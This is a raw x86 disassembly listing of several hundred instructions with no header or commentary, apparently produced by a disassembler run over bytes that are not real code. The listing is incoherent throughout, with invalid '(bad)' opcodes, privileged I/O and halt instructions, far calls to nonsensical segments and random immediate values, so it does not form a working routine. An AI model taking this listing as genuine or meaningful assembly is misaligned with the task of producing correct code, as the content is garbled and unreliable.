  40226b:	mov    eax,ds:0x4834a2
  402270:	add    DWORD PTR [eax+0x34],ecx
  402273:	test   eax,0x4870aa
  402278:	add    DWORD PTR [eax+0x70],ecx
  40227b:	mov    cl,0xb2
  40227d:	xor    al,0x48
  40227f:	add    BYTE PTR [ecx],al
  402281:	dec    eax
  402282:	xor    al,0xb9
  402284:	mov    WORD PTR [ebp-0x255d3cef],?
  40228a:	mov    esp,0x91094dc7
  40228f:	mov    al,bh
  402291:	adc    dh,BYTE PTR [eax+eax*1-0x74]
  402295:	jge    0x4022eb
  402297:	mov    al,BYTE PTR [ebp+0x42207b21]
  40229d:	(bad)  
  40229e:	je     0x40229f
  4022a0:	add    DWORD PTR [ecx+0x3b],esp
  4022a3:	mov    BYTE PTR [eax-0x6b],ah
  4022a6:	pop    ebp
  4022a7:	mov    edx,DWORD PTR [edx-0x49]
  4022aa:	and    BYTE PTR [ebx-0x7724cf40],dh
  4022b0:	add    DWORD PTR [eax],edi
  4022b2:	inc    ebp
  4022b3:	mov    ecx,DWORD PTR ds:0xa9af3b00
  4022b9:	adc    ebx,DWORD PTR [ecx+0x5c]
  4022bc:	fsub   QWORD PTR [ecx-0x34b20e4d]
  4022c2:	clc    
  4022c3:	mov    eax,DWORD PTR [ecx]
  4022c5:	dec    eax
  4022c6:	mov    cl,0xac
  4022c8:	popa   
  4022c9:	test   eax,0x8776f8c3
  4022ce:	popf   
  4022cf:	and    BYTE PTR ds:0xc6e90cbd,al
  4022d5:	sbb    BYTE PTR [eax],al
  4022d7:	add    BYTE PTR [ecx],al
  4022d9:	mov    ebp,DWORD PTR [eax-0x73]
  4022dc:	jle    0x4022f6
  4022de:	mov    eax,DWORD PTR [eax]
  4022e0:	or     eax,0xa9ae3b00
  4022e5:	adc    ecx,DWORD PTR [ebp+0x4102b500]
  4022eb:	add    eax,0x4004cedc
  4022f0:	or     al,0x2e
  4022f2:	stos   DWORD PTR es:[edi],eax
  4022f3:	sub    bh,BYTE PTR [eax-0x6f0c5a9c]
  4022f9:	inc    eax
  4022fa:	sub    al,0x79
  4022fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022fd:	dec    esp
  4022fe:	shl    DWORD PTR [ebx-0x33],0x83
  402302:	pusha  
  402303:	ret    
  402304:	imul   esp,DWORD PTR [eax+eax*1],0xd2310120
  40230b:	add    ch,BYTE PTR [ebx-0x64]
  40230e:	cmp    edi,edi
  402310:	test   eax,0x8dd8e114
  402315:	fsub   st,st(3)
  402317:	add    BYTE PTR [eax+0x74],ah
  40231a:	pop    ss
  40231b:	jo     0x402356
  40231d:	inc    edi
  40231e:	retf   
  40231f:	or     BYTE PTR [eax+0x11cc3c0],dh
  402325:	rol    BYTE PTR ds:0x4684b54b,0x54
  40232c:	add    BYTE PTR [ecx-0x6a41b3ac],bh
  402332:	mov    dh,BYTE PTR [esi-0x626a754f]
  402338:	call   0x4d24:0x351db91
  40233f:	cmc    
  402340:	push   ecx
  402341:	xchg   ebp,eax
  402342:	popa   
  402343:	ret    
  402344:	mov    ds:0xf25449ea,al
  402349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40234a:	sbb    cl,BYTE PTR [edx-0x33861654]
  402350:	and    al,0x0
  402352:	xchg   dh,al
  402354:	std    
  402355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402356:	mov    ebx,DWORD PTR [eax+esi*2]
  402359:	add    DWORD PTR ds:0x6130d425,ebp
  40235f:	xchg   BYTE PTR [esp+edx*1+0x50],al
  402363:	add    cl,dh
  402365:	sub    DWORD PTR [esi],esp
  402367:	jp     0x402328
  402369:	push   edx
  40236a:	cmp    al,0x46
  40236c:	jmp    0x144245c
  402371:	pop    edx
  402372:	call   0x723c178f
  402377:	enter  0x5ef4,0xa0
  40237b:	jbe    0x4023f8
  40237d:	pop    ebx
  40237e:	add    BYTE PTR [edi+0x58],ah
  402381:	or     BYTE PTR [edi+0x26],bl
  402384:	gs add al,bh
  402387:	retf   0x88bc
  40238a:	icebp  
  40238b:	sbb    eax,0xb63e6540
  402390:	cdq    
  402391:	cwde   
  402392:	dec    ebx
  402393:	out    0xed,al
  402395:	popa   
  402396:	dec    edx
  402397:	cmp    esp,DWORD PTR [ebp+0x16f8a81]
  40239d:	push   0x741bab60
  4023a2:	or     BYTE PTR cs:0x12040743,cl
  4023a9:	daa    
  4023aa:	xchg   edx,eax
  4023ab:	cmp    eax,0x16947a50
  4023b0:	jl     0x402346
  4023b2:	jp     0x402405
  4023b4:	push   esp
  4023b5:	jp     0x40234b
  4023b7:	jl     0x4023f3
  4023b9:	stos   BYTE PTR es:[edi],al
  4023ba:	test   DWORD PTR [eax+0x2],ebp
  4023bd:	outs   dx,BYTE PTR ds:[esi]
  4023be:	push   ds
  4023bf:	sub    ecx,DWORD PTR [edi]
  4023c1:	adc    bl,BYTE PTR [ecx]
  4023c3:	sbb    DWORD PTR [ebx],eax
  4023c5:	and    esi,DWORD PTR [esi]
  4023c7:	xchg   edi,eax
  4023c8:	test   eax,0xc9b6d758
  4023cd:	or     al,bh
  4023cf:	add    eax,0x66cb9a05
  4023d4:	bound  edx,QWORD PTR [esi]
  4023d6:	xchg   ebp,eax
  4023d7:	add    DWORD PTR [eax-0x59],ebx
  4023da:	push   es
  4023db:	push   ebx
  4023dc:	add    eax,0xbf5a5f3a
  4023e1:	and    DWORD PTR [edx+0x50],ebp
  4023e4:	add    DWORD PTR [ebx-0x45933e6],ecx
  4023ea:	cdq    
  4023eb:	add    BYTE PTR [ecx],al
  4023ed:	adc    ch,BYTE PTR [ebp-0x5b66a27a]
  4023f3:	inc    edi
  4023f4:	retf   
  4023f5:	bound  ebx,QWORD PTR [eax-0x2c]
  4023f8:	repnz push edx
  4023fa:	jbe    0x4023df
  4023fc:	ret    
  4023fd:	call   0x1b4f254
  402402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402403:	call   FWORD PTR [eax-0x59]
  402406:	sub    DWORD PTR [edi],eax
  402408:	leave  
  402409:	loop   0x4023a6
  40240b:	push   esp
  40240c:	pop    eax
  40240d:	adc    dh,BYTE PTR [esp+eiz*8]
  402410:	ja     0x402467
  402412:	sar    bh,1
  402414:	pop    esi
  402415:	lea    eax,[ebp-0x12]
  402418:	hlt    
  402419:	test   DWORD PTR [ecx-0x2fdf332c],ecx
  40241f:	ficomp WORD PTR [eax+edx*1+0x24]
  402423:	inc    esp
  402424:	add    DWORD PTR [eax],eax
  402426:	add    BYTE PTR [eax+0x69],ch
  402429:	add    BYTE PTR [eax],al
  40242b:	add    ah,al
  40242d:	xor    si,si
  402430:	xchg   ecx,eax
  402431:	mov    DWORD PTR [ebx],ebp
  402433:	cdq    
  402434:	cmp    eax,0xe255dce0
  402439:	adc    ah,BYTE PTR [ebp+0x640a6ee7]
  40243f:	rol    BYTE PTR [ecx],1
  402441:	sti    
  402442:	out    dx,eax
  402443:	arpl   dx,dx
  402445:	adc    ebp,DWORD PTR [edi-0x1]
  402448:	mov    DWORD PTR [ebp+0x75],esi
  40244b:	sub    BYTE PTR [ebp-0x13],cl
  40244e:	dec    ebx
  40244f:	and    eax,0x24523716
  402454:	jns    0x4023ef
  402456:	jmp    0x4024ce
  402458:	loop   0x40246d
  40245a:	dec    ebp
  40245b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40245c:	xchg   ecx,eax
  40245d:	sar    DWORD PTR [ecx+edx*4+0x554b0b6d],cl
  402464:	jno    0x4024e0
  402466:	sub    esp,ebx
  402468:	ret    
  402469:	sub    eax,DWORD PTR [ecx]
  40246b:	mov    dh,0x21
  40246d:	call   FWORD PTR [ecx-0x6bdbb010]
  402473:	mov    BYTE PTR [edi+0x0],ch
  402476:	jge    0x402413
  402478:	adc    DWORD PTR [eax],eax
  40247a:	aas    
  40247b:	outs   dx,BYTE PTR ds:[esi]
  40247c:	imul   ebp,DWORD PTR [eax-0x5a63efab],0x7e
  402483:	in     al,dx
  402484:	jmp    0x8ccc1509
  402489:	cld    
  40248a:	imul   eax,DWORD PTR [eax],0xdcfc6806
  402490:	add    edi,edi
  402492:	push   ebp
  402493:	and    DWORD PTR [ebx+0x55],ecx
  402496:	xchg   edi,eax
  402497:	rol    DWORD PTR [ecx+0x6e000068],cl
  40249d:	push   0x0
  40249f:	push   0x68
  4024a1:	push   0x8001036a
  4024a6:	aas    
  4024a7:	(bad)  
  4024a8:	test   eax,0xc1c40173
  4024ad:	and    BYTE PTR [edx*2-0x4a66f3c],0x2e
  4024b5:	mov    ds:0x5ec06144,eax
  4024ba:	(bad)  
  4024bb:	aam    0x4a
  4024bd:	jno    0x4024f1
  4024bf:	into   
  4024c0:	bound  esp,QWORD PTR [ebp+0x76]
  4024c3:	aam    0x1e
  4024c5:	sbb    edx,DWORD PTR [ecx-0x7c]
  4024c8:	sub    ebp,DWORD PTR [ebp+0x52]
  4024cb:	pop    edi
  4024cc:	lds    edx,FWORD PTR [edx+0x27b3bc5d]
  4024d2:	dec    esi
  4024d3:	xchg   DWORD PTR [ecx+0x6e],ecx
  4024d6:	mov    eax,0xadfbd425
  4024db:	jns    0x402492
  4024dd:	xchg   ebx,eax
  4024de:	adc    DWORD PTR [esi],esi
  4024e0:	sub    al,0x8f
  4024e2:	xchg   edx,eax
  4024e3:	lea    esi,[eax-0x5c713a9c]
  4024e9:	cmp    ch,dh
  4024eb:	aas    
  4024ec:	adc    al,0xa6
  4024ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024f0:	lea    esp,[edi-0x3ad51cf8]
  4024f6:	add    al,0xd7
  4024f8:	jnp    0x4024b7
  4024fa:	push   ds
  4024fb:	clc    
  4024fc:	xchg   DWORD PTR [ebx+0x12602],edx
  402502:	add    BYTE PTR [edi+0x1],dh
  402508:	add    DWORD PTR [eax],eax
  40250a:	add    BYTE PTR [eax],al
  40250c:	add    DWORD PTR [eax],eax
  40250e:	add    BYTE PTR [eax],al
  402510:	add    DWORD PTR [eax],eax
  402512:	add    BYTE PTR [eax],al
  402514:	add    DWORD PTR [eax],eax
  402516:	add    BYTE PTR [eax],al
  402518:	add    DWORD PTR [edx-0x6ffeff70],esi
  40251e:	xchg   edx,eax
  40251f:	add    eax,0x42004
  402524:	add    DWORD PTR [edi+0x7b27347b],eax
  40252a:	add    DWORD PTR [eax],0xffffff95
  40252d:	jmp    0x402569
  40252f:	and    eax,0x951f4415
  402534:	jecxz  0x40253b
  402536:	jb     0x402593
  402538:	ret    
  402539:	dec    esi
  40253a:	push   edx
  40253b:	sub    edx,DWORD PTR [edi]
  40253d:	push   cs
  40253e:	aaa    
  40253f:	push   0xf6ec58a4
  402544:	js     0x4024df
  402546:	aas    
  402547:	iret   
  402548:	sbb    eax,0x61770646
  40254d:	push   eax
  40254e:	mov    ch,0xe3
